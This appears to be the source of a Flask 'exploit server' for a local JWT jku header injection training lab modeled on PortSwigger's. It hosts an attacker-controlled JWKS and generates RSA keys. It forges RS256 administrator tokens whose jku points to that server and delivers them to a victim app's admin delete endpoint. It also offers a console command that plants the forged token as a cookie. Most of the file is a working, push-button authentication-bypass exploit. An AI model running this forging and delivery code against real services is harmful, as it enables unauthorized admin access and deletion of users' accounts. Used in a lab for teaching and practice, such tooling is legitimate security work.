"""
PortSwigger-style Exploit Server for JWT 'jku' Header Injection Lab.

Simulates attacker-controlled infrastructure:
1. Hosts the attacker's public key as a JWKS at /evil-jwks.json (and /jwks.json).
2. Provides a full interactive Web UI at http://localhost:6000/ to:
   - Generate fresh 2048-bit RSA keypairs.
   - Edit and store JWKS configurations.
   - Forge malicious RS256 JWTs with customized claims and jku header.
   - Deliver the exploit directly to the victim application.
   - Inspect live HTTP access logs from the victim app.
"""

import json
import os
import time
from datetime import datetime
from flask import Flask, jsonify, render_template_string, request
import requests
from authlib.jose import JsonWebKey, jwt

app = Flask(__name__)
JWKS_PATH = os.path.join(os.path.dirname(__file__), "jwks.json")

# In-memory store for generated keys and access logs
STATE = {
    "private_key": None,
    "kid": "attacker-key-1",
    "logs": [],
}

VICTIM_INTERNAL_URL = os.environ.get("VICTIM_URL", "http://victim-app:5000")
VICTIM_EXTERNAL_URL = os.environ.get("VICTIM_EXTERNAL_URL", "http://localhost:5000")


def log_request(endpoint: str, client_ip: str, headers: dict):
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "endpoint": endpoint,
        "ip": client_ip,
        "user_agent": headers.get("User-Agent", "Unknown"),
    }
    STATE["logs"].insert(0, entry)
    if len(STATE["logs"]) > 50:
        STATE["logs"].pop()


def ensure_default_jwks():
    """Ensure a valid attacker key exists on startup."""
    has_keys = False
    if os.path.exists(JWKS_PATH) and os.path.getsize(JWKS_PATH) > 0:
        try:
            with open(JWKS_PATH, "r") as f:
                data = json.load(f)
            if data.get("keys"):
                has_keys = True
                pub = data["keys"][0]
                STATE["kid"] = pub.get("kid", "attacker-key-1")
        except Exception:
            pass

    if not has_keys or not STATE.get("private_key"):
        key = JsonWebKey.generate_key("RSA", 2048, is_private=True)
        kid = "attacker-key-1"
        private_jwk = key.as_dict(is_private=True)
        private_jwk["kid"] = kid
        public_jwk = key.as_dict(is_private=False)
        public_jwk["kid"] = kid
        STATE["private_key"] = private_jwk
        STATE["kid"] = kid
        with open(JWKS_PATH, "w") as f:
            json.dump({"keys": [public_jwk]}, f, indent=2)


ensure_default_jwks()


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


@app.get("/evil-jwks.json")
@app.get("/jwks.json")
def evil_jwks():
    log_request(request.path, request.remote_addr, dict(request.headers))
    if not os.path.exists(JWKS_PATH):
        return jsonify({"keys": []})
    try:
        with open(JWKS_PATH, "r") as f:
            data = json.load(f)
        return jsonify(data)
    except Exception as e:
        return jsonify({"error": f"Failed to read JWKS: {e}"}), 500


@app.get("/api/logs")
def get_logs():
    return jsonify(STATE["logs"])


@app.post("/api/generate-key")
def generate_key():
    data = request.get_json(silent=True) or {}
    kid = data.get("kid", f"attacker-key-{int(time.time())}")
    key = JsonWebKey.generate_key("RSA", 2048, is_private=True)
    priv = key.as_dict(is_private=True)
    priv["kid"] = kid
    pub = key.as_dict(is_private=False)
    pub["kid"] = kid

    STATE["private_key"] = priv
    STATE["kid"] = kid

    # Save to jwks.json
    with open(JWKS_PATH, "w") as f:
        json.dump({"keys": [pub]}, f, indent=2)

    return jsonify({
        "status": "success",
        "kid": kid,
        "private_jwk": priv,
        "public_jwks": {"keys": [pub]},
    })


@app.post("/api/store-jwks")
def store_jwks():
    data = request.get_json(silent=True) or {}
    content = data.get("content")
    if isinstance(content, str):
        try:
            parsed = json.loads(content)
        except json.JSONDecodeError as e:
            return jsonify({"error": f"Invalid JSON format: {e}"}), 400
    elif isinstance(content, dict):
        parsed = content
    else:
        return jsonify({"error": "Missing 'content' field"}), 400

    with open(JWKS_PATH, "w") as f:
        json.dump(parsed, f, indent=2)

    return jsonify({"status": "stored", "keys_count": len(parsed.get("keys", []))})


@app.post("/api/forge-token")
def forge_token_api():
    data = request.get_json(silent=True) or {}
    jku = data.get("jku", "http://attacker-jwks:6000/evil-jwks.json")
    kid = data.get("kid") or STATE.get("kid") or "attacker-key-1"
    sub = data.get("sub", "administrator")
    role = data.get("role", "admin")

    private_jwk = data.get("private_key") or STATE.get("private_key")
    if not private_jwk:
        # Generate one on the fly if none exists
        key = JsonWebKey.generate_key("RSA", 2048, is_private=True)
        private_jwk = key.as_dict(is_private=True)
        private_jwk["kid"] = kid
        STATE["private_key"] = private_jwk
        STATE["kid"] = kid

    header = {
        "alg": "RS256",
        "kid": kid,
        "jku": jku,
    }
    payload = {
        "sub": sub,
        "role": role,
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400,
    }

    token = jwt.encode(header, payload, private_jwk).decode()
    return jsonify({
        "token": token,
        "header": header,
        "payload": payload,
    })


@app.post("/api/deliver-exploit")
def deliver_exploit_api():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    if not token:
        return jsonify({"error": "Missing token"}), 400

    target_user = data.get("target_user", "carlos")
    url = f"{VICTIM_INTERNAL_URL}/admin/delete?username={target_user}"

    try:
        resp = requests.get(
            url,
            headers={"Authorization": f"Bearer {token}"},
            cookies={"session": token, "jwt": token},
            timeout=5,
        )
        return jsonify({
            "status_code": resp.status_code,
            "response": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text,
            "headers": dict(resp.headers),
        })
    except Exception as e:
        # Fallback to external/localhost url if running in hybrid host mode
        fallback_url = f"{VICTIM_EXTERNAL_URL}/admin/delete?username={target_user}"
        try:
            resp = requests.get(
                fallback_url,
                headers={"Authorization": f"Bearer {token}"},
                cookies={"session": token, "jwt": token},
                timeout=5,
            )
            return jsonify({
                "status_code": resp.status_code,
                "response": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text,
                "headers": dict(resp.headers),
            })
        except Exception as e2:
            return jsonify({"error": f"Victim app request failed: {e} | Fallback: {e2}"}), 502


EXPLOIT_SERVER_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Exploit Server | PortSwigger Web Security Academy</title>
  <link rel="icon" type="image/x-icon" href="https://portswigger.net/favicon.ico">
  <style>
    :root {
      --primary: #ff6633;
      --primary-dark: #e05526;
      --bg-dark: #1f242d;
      --bg-card: #272c36;
      --border-color: #3b4354;
      --text-main: #f3f4f6;
      --text-muted: #9ca3af;
      --code-bg: #14171d;
      --success: #10b981;
      --danger: #ef4444;
      --cyan: #06b6d4;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: var(--bg-dark);
      color: var(--text-main);
      line-height: 1.5;
      padding: 0 0 40px 0;
    }
    header {
      background: #14171d;
      border-bottom: 2px solid var(--primary);
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 12px;
      font-weight: 700;
      font-size: 1.25rem;
      color: var(--text-main);
    }
    .brand-badge {
      background: var(--primary);
      color: #fff;
      padding: 4px 10px;
      font-size: 0.75rem;
      border-radius: 4px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .nav-links a {
      color: var(--text-muted);
      text-decoration: none;
      font-weight: 500;
      margin-left: 20px;
      transition: color 0.2s;
    }
    .nav-links a:hover { color: var(--primary); }
    .container {
      max-width: 1200px;
      margin: 32px auto;
      padding: 0 20px;
    }
    .card {
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 8px;
      padding: 24px;
      margin-bottom: 24px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
    }
    .card-title {
      font-size: 1.15rem;
      font-weight: 600;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid var(--border-color);
      padding-bottom: 12px;
      color: #fff;
    }
    .card-subtitle {
      font-size: 0.875rem;
      color: var(--text-muted);
      margin-bottom: 16px;
    }
    .form-group {
      margin-bottom: 16px;
    }
    label {
      display: block;
      font-size: 0.85rem;
      font-weight: 600;
      color: var(--text-muted);
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    input[type="text"], textarea {
      width: 100%;
      background: var(--code-bg);
      border: 1px solid var(--border-color);
      border-radius: 6px;
      padding: 10px 14px;
      color: #a5f3fc;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
      font-size: 0.9rem;
      transition: border-color 0.2s;
    }
    input[type="text"]:focus, textarea:focus {
      outline: none;
      border-color: var(--primary);
    }
    textarea { min-height: 140px; resize: vertical; }
    .btn-group {
      display: flex;
      flex-wrap: wrap;
      gap: 12px;
      margin-top: 16px;
    }
    button, .btn {
      background: var(--primary);
      color: #fff;
      border: none;
      border-radius: 6px;
      padding: 10px 18px;
      font-size: 0.9rem;
      font-weight: 600;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      transition: background 0.2s, transform 0.1s;
      text-decoration: none;
    }
    button:hover, .btn:hover { background: var(--primary-dark); }
    button:active { transform: translateY(1px); }
    .btn-secondary {
      background: #374151;
      color: #e5e7eb;
    }
    .btn-secondary:hover { background: #4b5563; }
    .btn-success {
      background: var(--success);
      color: #fff;
    }
    .btn-success:hover { background: #059669; }
    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 24px;
    }
    @media (max-width: 850px) {
      .grid-2 { grid-template-columns: 1fr; }
    }
    .token-display {
      background: var(--code-bg);
      border: 1px solid var(--border-color);
      border-radius: 6px;
      padding: 16px;
      word-break: break-all;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
      font-size: 0.85rem;
      color: #38bdf8;
      max-height: 120px;
      overflow-y: auto;
    }
    .response-box {
      background: #0f172a;
      border: 1px solid #1e293b;
      border-radius: 6px;
      padding: 16px;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
      font-size: 0.85rem;
      color: #f1f5f9;
      white-space: pre-wrap;
      max-height: 250px;
      overflow-y: auto;
      margin-top: 12px;
    }
    .log-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    .log-table th, .log-table td {
      padding: 10px 14px;
      text-align: left;
      border-bottom: 1px solid var(--border-color);
    }
    .log-table th {
      color: var(--text-muted);
      font-weight: 600;
      text-transform: uppercase;
      font-size: 0.75rem;
    }
    .pill {
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 0.75rem;
      font-weight: 600;
    }
    .pill-get { background: #1e3a8a; color: #93c5fd; }
    .pill-success { background: #064e3b; color: #6ee7b7; }
    .toast {
      position: fixed;
      bottom: 24px;
      right: 24px;
      background: #10b981;
      color: white;
      padding: 12px 20px;
      border-radius: 6px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      font-size: 0.9rem;
      font-weight: 500;
      opacity: 0;
      transition: opacity 0.3s;
      pointer-events: none;
      z-index: 1000;
    }
    .toast.show { opacity: 1; }
  </style>
</head>
<body>

  <header>
    <div class="brand">
      <span class="brand-badge">Exploit Server</span>
      <span>Simulated Attacker Infrastructure (:6000)</span>
    </div>
    <div class="nav-links">
      <a href="http://localhost:5000" target="_blank">&larr; Back to Victim Lab (Port 5000)</a>
      <a href="/evil-jwks.json" target="_blank">View /evil-jwks.json</a>
    </div>
  </header>

  <div class="container">

    <!-- Step 1: RSA Keypair & JWKS Storage -->
    <div class="card">
      <div class="card-title">
        <span>1. Attacker JWKS (Public Key) Configuration</span>
        <button class="btn btn-secondary" onclick="generateKeypair()">
          &circlearrowright; Generate New RSA Keypair
        </button>
      </div>
      <div class="card-subtitle">
        The vulnerable victim app fetches whatever URL is specified in the JWT header's <code>jku</code> parameter.
        Store your public key here so the victim server trusts signatures created with your private key.
      </div>
      <div class="form-group">
        <label>Served Endpoint File URL</label>
        <input type="text" id="jwksUrl" value="http://attacker-jwks:6000/evil-jwks.json" readonly style="color: #f59e0b;">
      </div>
      <div class="form-group">
        <label>JWKS JSON Content (Public Keys)</label>
        <textarea id="jwksContent">{{ jwks_json }}</textarea>
      </div>
      <div class="btn-group">
        <button onclick="storeJwks()" class="btn-success">Save / Store JWKS</button>
        <a href="/evil-jwks.json" target="_blank" class="btn btn-secondary">View Exploit Endpoint</a>
      </div>
    </div>

    <!-- Step 2: JWT Forger & Delivery -->
    <div class="grid-2">
      <!-- JWT Forging Controls -->
      <div class="card">
        <div class="card-title">
          <span>2. JWT Token Forger</span>
        </div>
        <div class="card-subtitle">
          Craft an administrator JWT signed with the attacker's RSA private key.
        </div>
        <div class="form-group">
          <label>Header: jku (JWK Set URL)</label>
          <input type="text" id="forgeJku" value="http://attacker-jwks:6000/evil-jwks.json">
        </div>
        <div class="form-group">
          <label>Header: kid (Key ID)</label>
          <input type="text" id="forgeKid" value="{{ kid }}">
        </div>
        <div class="form-group">
          <label>Payload: sub (Subject / Username)</label>
          <input type="text" id="forgeSub" value="administrator">
        </div>
        <div class="form-group">
          <label>Payload: role</label>
          <input type="text" id="forgeRole" value="admin">
        </div>
        <div class="btn-group">
          <button onclick="forgeToken()" class="btn">Sign &amp; Forge JWT</button>
        </div>
      </div>

      <!-- Exploit Execution & Result -->
      <div class="card">
        <div class="card-title">
          <span>3. Exploit Delivery &amp; Verification</span>
        </div>
        <div class="card-subtitle">
          Deliver the forged token to the victim application to bypass authentication and delete user <code>carlos</code>.
        </div>
        <div class="form-group">
          <label>Forged Admin JWT Token</label>
          <div class="token-display" id="tokenDisplay">{{ initial_token or 'Click "Sign & Forge JWT" to generate' }}</div>
        </div>
        <div class="btn-group">
          <button onclick="deliverExploit()" class="btn-success" id="btnDeliver">&blacktriangleright; Deliver Exploit to Victim</button>
          <button onclick="copyToken()" class="btn-secondary">&boxbox; Copy Token</button>
          <button onclick="copyCookieCode()" class="btn-secondary">Copy Browser Console Command</button>
        </div>
        <div class="response-box" id="responseBox" style="display: none;"></div>
      </div>
    </div>

    <!-- Step 3: Access Logs -->
    <div class="card">
      <div class="card-title">
        <span>Exploit Server Access Log</span>
        <button class="btn btn-secondary" onclick="refreshLogs()">&circlearrowright; Refresh Logs</button>
      </div>
      <div class="card-subtitle">
        Incoming HTTP requests received by this server. When the victim app verifies your token, you will see a GET request for <code>/evil-jwks.json</code> here!
      </div>
      <table class="log-table">
        <thead>
          <tr>
            <th>Timestamp</th>
            <th>Method &amp; Path</th>
            <th>Client IP</th>
            <th>User-Agent</th>
          </tr>
        </thead>
        <tbody id="logsTableBody">
          {% for log in logs %}
          <tr>
            <td>{{ log.timestamp }}</td>
            <td><span class="pill pill-get">GET</span> {{ log.endpoint }}</td>
            <td><code>{{ log.ip }}</code></td>
            <td style="color: var(--text-muted); font-size: 0.75rem;">{{ log.user_agent }}</td>
          </tr>
          {% else %}
          <tr>
            <td colspan="4" style="text-align: center; color: var(--text-muted); padding: 20px;">
              No requests logged yet. Deliver an exploit or visit /evil-jwks.json to view entries.
            </td>
          </tr>
          {% endfor %}
        </tbody>
      </table>
    </div>

  </div>

  <div id="toast" class="toast">Action completed successfully</div>

  <script>
    let currentToken = "{{ initial_token }}";

    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.innerText = msg;
      toast.classList.add('show');
      setTimeout(() => toast.classList.remove('show'), 3000);
    }

    async function generateKeypair() {
      try {
        const res = await fetch('/api/generate-key', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({kid: 'attacker-key-' + Date.now()})
        });
        const data = await res.json();
        if (data.status === 'success') {
          document.getElementById('jwksContent').value = JSON.stringify(data.public_jwks, null, 2);
          document.getElementById('forgeKid').value = data.kid;
          showToast('Generated fresh 2048-bit RSA keypair!');
          forgeToken();
        }
      } catch (err) {
        alert('Failed to generate keypair: ' + err);
      }
    }

    async function storeJwks() {
      const content = document.getElementById('jwksContent').value;
      try {
        const res = await fetch('/api/store-jwks', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({content: content})
        });
        const data = await res.json();
        if (data.error) {
          alert('Error: ' + data.error);
        } else {
          showToast('JWKS stored successfully! Ready to serve.');
        }
      } catch (err) {
        alert('Failed to store JWKS: ' + err);
      }
    }

    async function forgeToken() {
      const jku = document.getElementById('forgeJku').value;
      const kid = document.getElementById('forgeKid').value;
      const sub = document.getElementById('forgeSub').value;
      const role = document.getElementById('forgeRole').value;

      try {
        const res = await fetch('/api/forge-token', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({jku, kid, sub, role})
        });
        const data = await res.json();
        currentToken = data.token;
        document.getElementById('tokenDisplay').innerText = currentToken;
        showToast('Forged administrator JWT successfully!');
      } catch (err) {
        alert('Failed to forge token: ' + err);
      }
    }

    async function deliverExploit() {
      if (!currentToken) {
        await forgeToken();
      }
      const respBox = document.getElementById('responseBox');
      respBox.style.display = 'block';
      respBox.innerText = 'Sending forged token to victim app (/admin/delete?username=carlos)...';

      try {
        const res = await fetch('/api/deliver-exploit', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({token: currentToken, target_user: 'carlos'})
        });
        const data = await res.json();
        respBox.innerText = JSON.stringify(data, null, 2);
        if (data.status_code === 200 || (data.response && data.response.solved)) {
          showToast('EXPLOIT SUCCESSFUL! Carlos deleted & Lab solved!');
        } else {
          showToast('Exploit delivered (Status: ' + data.status_code + ')');
        }
        refreshLogs();
      } catch (err) {
        respBox.innerText = 'Error delivering exploit: ' + err;
      }
    }

    function copyToken() {
      if (!currentToken) return alert('No token forged yet');
      navigator.clipboard.writeText(currentToken);
      showToast('Copied forged JWT token to clipboard!');
    }

    function copyCookieCode() {
      if (!currentToken) return alert('No token forged yet');
      const code = `document.cookie = "session=" + "${currentToken}" + "; path=/"; document.cookie = "jwt=" + "${currentToken}" + "; path=/"; window.location.href = "http://localhost:5000/admin";`;
      navigator.clipboard.writeText(code);
      showToast('Copied JavaScript console command to clipboard!');
    }

    async function refreshLogs() {
      try {
        const res = await fetch('/api/logs');
        const logs = await res.json();
        const tbody = document.getElementById('logsTableBody');
        if (!logs.length) {
          tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); padding: 20px;">No requests logged yet.</td></tr>';
          return;
        }
        tbody.innerHTML = logs.map(l => `
          <tr>
            <td>${l.timestamp}</td>
            <td><span class="pill pill-get">GET</span> ${l.endpoint}</td>
            <td><code>${l.ip}</code></td>
            <td style="color: var(--text-muted); font-size: 0.75rem;">${l.user_agent}</td>
          </tr>
        `).join('');
      } catch (err) {
        console.error(err);
      }
    }

    // Auto-refresh logs every 4 seconds
    setInterval(refreshLogs, 4000);
  </script>
</body>
</html>
"""


@app.get("/")
def home():
    jwks_json = "{}"
    if os.path.exists(JWKS_PATH):
        try:
            with open(JWKS_PATH, "r") as f:
                jwks_json = json.dumps(json.load(f), indent=2)
        except Exception:
            pass

    # Pre-forge initial token
    initial_token = ""
    try:
        if STATE.get("private_key"):
            h = {"alg": "RS256", "kid": STATE["kid"], "jku": "http://attacker-jwks:6000/evil-jwks.json"}
            p = {"sub": "administrator", "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 86400}
            initial_token = jwt.encode(h, p, STATE["private_key"]).decode()
    except Exception:
        pass

    return render_template_string(
        EXPLOIT_SERVER_HTML,
        jwks_json=jwks_json,
        kid=STATE["kid"],
        initial_token=initial_token,
        logs=STATE["logs"],
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=6000, debug=False)
